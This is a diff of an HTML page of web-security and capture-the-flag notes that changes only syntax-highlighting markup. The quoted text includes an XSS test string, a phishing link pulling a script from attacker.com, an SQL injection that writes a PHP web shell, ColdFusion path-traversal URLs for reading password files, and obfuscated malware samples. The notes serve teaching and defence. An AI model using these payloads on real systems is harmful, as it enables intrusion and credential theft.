@@ -23,14 +23,14 @@
 &lt;ol&gt;
 &lt;li&gt;The target website perform  query searches that are not sanitized. For example, the query could accept scripts on it. A simple example to check this vulnerability is by verifying whether the alert box with the message &lt;strong&gt;Pwnd&lt;/strong&gt; is displayed:&lt;/li&gt;
 &lt;/ol&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;http://website.org?q=&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="na"&gt;20type=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;text/javascript&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;alert(&amp;#39;Pwnd!&amp;#39;);&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//website.org?q=&amp;lt;script%20type=&amp;#39;text/javascript&amp;#39;&amp;gt;alert(&amp;#39;Pwnd!&amp;#39;);&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ol&gt;
 &lt;li&gt;The attacker crafts an exploit script that gets the victim's authorization information (for example in an &lt;strong&gt;Authorization Cookie&lt;/strong&gt;). The attacker sends a &lt;strong&gt;phishing email&lt;/strong&gt; to the victim with a link with some script such as:&lt;/li&gt;
 &lt;/ol&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;http://website.org?q=puppies&amp;lt;script%20src=&amp;quot;http://attacker.com/exploit.js&amp;quot;&amp;gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//website.org?q=puppies&amp;lt;script%20src=&amp;quot;http://attacker.com/exploit.js&amp;quot;&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -123,7 +123,7 @@
 &lt;h2&gt;Clickjacking&lt;/h2&gt;
 &lt;p&gt;The act of obscuring a portion of a web application so that the victim is not aware that individual clicks are delivered to other site. For example, a malicious site wraps another site in a frame.&lt;/p&gt;
 &lt;p&gt;If a website includes iframe, there is a chance that it can perform a SQL query searching for iframe code. For example:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;SELECT * FROM blog_posts WHERE post_text LIKE &amp;#39;%&amp;gt;iframe%&amp;#39;;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;blog_posts&lt;/span&gt; &lt;span class="n"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;post_text&lt;/span&gt; &lt;span class="n"&gt;LIKE&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;iframe&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -205,16 +205,16 @@
 &lt;ul&gt;
 &lt;li&gt;Malicious code that is obfuscated to avoid detection:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;eval(base64_decode(&amp;quot;aWYoZnVuaauUl+hasdqetiDi2iOwlOHTgs+slgsfUNlsgasdf&amp;quot;));
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;aWYoZnVuaauUl+hasdqetiDi2iOwlOHTgs+slgsfUNlsgasdf&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Shared object files designed to randomly write harmful code to otherwise benign scripts:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;#httpd.conf modified by the hacker
-LoadModule harmful_module modules/mod_harmful.so
-AddModule mod_harmful.c
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#httpd.conf modified by the hacker&lt;/span&gt;
+&lt;span class="n"&gt;LoadModule&lt;/span&gt; &lt;span class="n"&gt;harmful_module&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mod_harmful&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;
+&lt;span class="n"&gt;AddModule&lt;/span&gt; &lt;span class="n"&gt;mod_harmful&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -225,7 +225,7 @@ AddModule mod_harmful.c
 &lt;ul&gt;
 &lt;li&gt;Investigate all possible harmful code on the website. It may be helpful to search for words like [iframe] to find iframe code. Other helpful keywords are "script", "eval", and "unescape." For example, on Unix-based systems:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;grep -irn &lt;span class="s2"&gt;&amp;quot;iframe&amp;quot;&lt;/span&gt; ./ &lt;span class="p"&gt;|&lt;/span&gt; less
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;grep -irn &lt;span class="s2"&gt;&amp;quot;iframe&amp;quot;&lt;/span&gt; ./ | less
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -350,7 +350,7 @@ AddModule mod_harmful.c
 &lt;ul&gt;
 &lt;li&gt;Write files and create a PHP shell into &lt;strong&gt;URL/shell.php&lt;/strong&gt;, we can use a parameter &lt;strong&gt;x&lt;/strong&gt; to takes a parameter to be executed (based on &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/web-400"&gt;this&lt;/a&gt;):&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;UNION&lt;/span&gt; &lt;span class="nx"&gt;ALL&lt;/span&gt; &lt;span class="nx"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Type: text/plain;charset=utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39;,3 INTO OUTFILE &amp;#39;/var/www/html/shell.php&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;UNION&lt;/span&gt; &lt;span class="nt"&gt;ALL&lt;/span&gt; &lt;span class="nt"&gt;SELECT&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;?php header(&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;text&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;plain&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;utf-8&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;); echo system($-GET&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt;); ?&amp;gt;&amp;#39;,3 INTO OUTFILE &amp;#39;/var/www/html/shell.php&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;--&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -370,13 +370,13 @@ AddModule mod_harmful.c
 &lt;p&gt;At the ColdFusion administrator, verify the version, and then use these injections:&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;(Version 6): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en&lt;/span&gt;
 
-(Version 7): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en&lt;/span&gt;
 
-(Version 8): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en&lt;/span&gt;
 
-(All versions): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;All&lt;/span&gt; &lt;span class="n"&gt;versions&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -408,14 +408,14 @@ AddModule mod_harmful.c
 &lt;ul&gt;
 &lt;li&gt;Look for POST requests:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;http.request.method == &amp;quot;POST&amp;quot;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Submit the found data (same username, nonce, and password) with the command:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;curl --data &lt;span class="s1"&gt;&amp;#39;user=manager&amp;amp;nonce=7413734ab666ce02cf27c9862c96a8e7&amp;amp;pass=3ecd6317a873b18e7dde351ac094ee3b&amp;#39;&lt;/span&gt; HOST
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;manager&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;nonce&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;7413734&lt;/span&gt;&lt;span class="n"&gt;ab666ce02cf27c9862c96a8e7&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;ecd6317a873b18e7dde351ac094ee3b&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;HOST&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -466,7 +466,7 @@ AddModule mod_harmful.c
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;tee&lt;/strong&gt; is nice to store and view the output of another command. It can be very useful with &lt;em&gt;curl&lt;/em&gt;. A simple  example:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls &lt;span class="p"&gt;|&lt;/span&gt; tee file
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls | tee file
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -481,7 +481,7 @@ AddModule mod_harmful.c
 &lt;p&gt;&lt;strong&gt;md5 hashing&lt;/strong&gt; is used all the time:&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -n password &lt;span class="p"&gt;|&lt;/span&gt; md5sum
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -n password | md5sum
 5f4dcc3b5aa765d61d8327deb882cf99
 &lt;/pre&gt;&lt;/div&gt;
 
